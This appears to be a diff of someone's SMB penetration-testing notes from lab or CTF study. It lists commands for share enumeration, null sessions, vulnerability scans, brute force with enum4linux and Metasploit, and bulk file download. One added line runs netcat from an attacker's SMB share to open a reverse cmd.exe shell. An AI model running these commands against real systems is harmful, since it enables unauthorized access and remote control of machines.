@@ -1,25 +1,67 @@
 # enumerating SMB 
+```bash
 smbclient -L //$IP/ ##to check for directories without logging in 
-smbclient //$IP/Directory login without auth
+smbclient //$IP/Directory # login without auth
 
 Enumerate Hostname : nmblookup -A [ip] 
-## List Shares
+
+-U # Username
+```
+## flags
+```bash
 smbmap -H [ip/hostname]
 echo exit | smbclient -L \\\\[ip]
 nmap --script smb-enum-shares -p 139,445 [ip]
-- Check Null Sessions
+# Check Null Sessions
 smbmap -H [ip/hostname]
 smbclient \\\\[ip]\\[share name]
-Check for Vulnerabilities - nmap --script smb-vuln* -p 139,445 [ip]
-Overall Scan - enum4linux -a [ip]
-Manual Inspection
-smbver.sh [IP] (port) [Samba]
-check pcap
+nmap --script smb-vuln* -p 139,445 [ip] # Check for Vulnerabilities - 
+Overall Scan - enum4linux -a [ip] 
+smbver.sh [IP] (port) [Samba] # Manual Inspection
+-N #Force to not use password aka NULL session attack
+get flag_1 - # read file
+```
+
+# Nbtstat ( Windows )
+![[Pasted image 20221123163002.png]]
+```powershell
+nbtstat -A <IP>
+
+Unique # Only 1 Ip assigned to the machine
+<00>   # Workstation 
+<20>   # File share is running 
+
+```
+
+## NET VIEW 
+
+![[Pasted image 20221123163219.png]]
+```
+NET VIEW <target IP>
+```
+
+## Linux
+![[Pasted image 20221123163345.png]]
+```bash
+nmblookup -A <Target IP>
+
+```
 
 
 # SMB server
 smbserver.py NAME $(DIR) -smb2support -user USER -password password
 exde1234
+```
+smbserver.py share DIRECTORY # Start Smbserver
+
+
+
+# Connect back to smb server (Windows)
+
+\\IP\SHARE\nc.exe -e cmd.exe IP PORT
+```
+
+
 
 
 # connect smb windows
@@ -35,4 +77,31 @@ prompt off
 recurse on
 ls
 mget *
+```
+
+# Brute-Force 
+
+```bash
+# Metasploit
+smb_login
+
+```
+
+# Check for shares permissions
+
+```
+smbmap -H demo.ine.local
+```
+
+# Enum4linux
+```bash
+enum4linux -s ~/Desktop/wordlists/100-common-passwords.txt demo.ine.local # brute force directory name
+
+enum4linux -U <IP> # enum users
+
+-P # Password policy
+-o # OS info
+-l # ldap
+-a # ALL 
+
 ```
